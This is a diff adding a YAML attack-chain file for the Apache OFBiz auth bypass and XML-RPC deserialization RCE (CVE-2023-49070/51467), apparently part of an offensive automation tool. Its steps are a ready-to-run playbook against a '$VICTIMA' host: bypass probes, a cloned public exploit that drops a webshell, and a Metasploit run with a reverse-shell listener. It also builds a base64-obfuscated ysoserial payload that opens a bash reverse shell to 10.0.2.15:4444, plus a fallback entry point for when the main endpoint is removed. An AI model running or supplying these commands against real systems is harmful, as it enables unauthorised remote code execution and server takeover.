@@ -1,0 +1,65 @@
+chain_id: ofbiz_cve_2023_49070
+title: "Apache OFBiz — CVE-2023-49070 / CVE-2023-51467 unauth XML-RPC RCE"
+severity: CRITICAL
+tags: [web, ofbiz, apache, cve-2023-49070, cve-2023-51467, xml-rpc, deserialization, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-49070" }
+    - { kind: "CVE-2023-51467" }
+    - { banner_pattern: "(?i)ofbiz|apache\\s*ofbiz" }
+    - { product_pattern: "(?i)ofbiz" }
+    - { path_pattern: "(?i)/webtools/control/(xmlrpc|ProgramExport|main)" }
+
+description: |
+  Apache OFBiz < 18.12.10 ships a still-routable `/webtools/control/xmlrpc`
+  endpoint and a `requirePasswordChange=Y` auth bypass (CVE-2023-51467).
+  Combined: unauth POST → XML-RPC deserialization → RCE. Fix to
+  CVE-2023-49070 was incomplete — 51467 weaponized the leftover. Mass
+  internet exploitation Q1-2024.
+
+steps:
+  - id: 1
+    title: "Confirm OFBiz is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA:443/webtools/control/main" | grep -i 'ofbiz'
+      curl -sk "https://$VICTIMA:443/accounting/control/main" -I
+
+  - id: 2
+    title: "Auth bypass probe (CVE-2023-51467)"
+    command: |
+      curl -sk -i "https://$VICTIMA/webtools/control/ViewBlogArticle?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y"
+
+  - id: 3
+    title: "Public PoC drops a webshell"
+    command: |
+      git clone https://github.com/jakabakos/CVE-2023-51467-Apache-Ofbiz-Authentication-Bypass /tmp/ofbiz
+      python3 /tmp/ofbiz/exploit.py -u https://$VICTIMA -c id
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/apache_ofbiz_deserialization_soap; \
+        set RHOSTS $VICTIMA; set RPORT 443; set SSL true; \
+        set TARGETURI / ; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Direct XML-RPC payload (ROME deserialization gadget)"
+    command: |
+      # Generate gadget with ysoserial:
+      java -jar ysoserial.jar ROME 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > /tmp/p.bin
+      curl -sk -X POST "https://$VICTIMA/webtools/control/xmlrpc?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y" \
+        -H 'Content-Type: text/xml' --data-binary @/tmp/p.bin
+
+common_errors:
+  - error: "/webtools/control/xmlrpc returns 404"
+    solution: |
+      Patched (≥ 18.12.11) or `xmlrpc` mount removed in ofbiz-component.
+      Try the alternative `ProgramExport` Groovy entry (same auth
+      bypass query string).
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-49070
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-51467
+  - https://issues.apache.org/jira/browse/OFBIZ-12873
